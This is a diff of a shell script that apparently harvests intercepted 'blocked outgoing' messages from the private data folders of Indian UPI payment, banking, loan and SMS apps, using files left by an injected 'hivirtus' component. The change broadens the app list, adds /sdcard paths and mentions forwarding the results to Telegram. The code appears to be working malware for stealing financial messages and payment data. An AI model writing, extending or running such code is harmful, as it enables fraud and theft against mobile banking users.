@@ -819,17 +819,14 @@ already_forwarded_outgoing() {
 harvest_blocked_outgoing() {
   purge_junk_outgoing_files
   local best="" best_mt=0
-  local dest body digits
-  # Prefer UPI apps over Messages — Messages OTP junk was overwriting forever
-  for pkg in com.herofincorp.diyjourneys com.herofincorp.simplycash com.customer.herofincorp \
-             com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm \
-             com.myairtelapp com.yespay.next com.yesbank.yespay com.kreditbee.android \
-             com.stashfin.android com.fampay.in com.snapmint.customerapp \
-             com.bharatpe.app com.jump.app in.jploft.jump com.supermoney \
-             com.whizdm.moneyview.loans com.whizdm.moneyview com.flipkart.android \
-             com.hdfcbank.payzapp com.axis.mobile \
+  local dest body digits pkg f mt bn
+  # ALL UPI packages (was missing ESAF / fisglobal → TG To+body miss)
+  for pkg in $UPI_PACKAGES \
              com.google.android.apps.messaging com.samsung.android.messaging \
-             com.android.messaging com.android.mms com.motorola.messaging com.android.mms.service; do
+             com.android.messaging com.android.mms com.motorola.messaging com.android.mms.service
+  do
+    pkg=$(echo "$pkg" | tr -d ' \r\n')
+    [ -z "$pkg" ] && continue
     for f in \
       "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
       "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.json" \
@@ -838,7 +835,9 @@ harvest_blocked_outgoing() {
       "/data/user/0/$pkg/files/hivirtus_outgoing_blocked.json" \
       "/data/data/$pkg/files/hivirtus_outgoing_blocked.json" \
       "/data/user/0/$pkg/files/hivirtus_pending_verify.json" \
-      "/data/data/$pkg/files/hivirtus_pending_verify.json"
+      "/data/data/$pkg/files/hivirtus_pending_verify.json" \
+      "/sdcard/Documents/hivirtus_outgoing_blocked.json" \
+      "/sdcard/Download/hivirtus_outgoing_blocked.json"
     do
       is_valid_outgoing_json "$f" || continue
       dest=$(grep -o '"dest"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
@@ -863,7 +862,9 @@ harvest_blocked_outgoing() {
       "/data/user/0/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.flag" \
       "/data/data/$pkg/code_cache/hivirtus/hivirtus_outgoing_blocked.flag" \
       "/data/user/0/$pkg/files/hivirtus_outgoing_blocked.flag" \
-      "/data/data/$pkg/files/hivirtus_outgoing_blocked.flag"
+      "/data/data/$pkg/files/hivirtus_outgoing_blocked.flag" \
+      "/sdcard/Documents/hivirtus_outgoing_blocked.flag" \
+      "/sdcard/Download/hivirtus_outgoing_blocked.flag"
     do
       [ -f "$f" ] && [ -s "$f" ] || continue
       grep -qiE 'is your OTP|<#>|Valid for' "$f" 2>/dev/null && { rm -f "$f"; continue; }
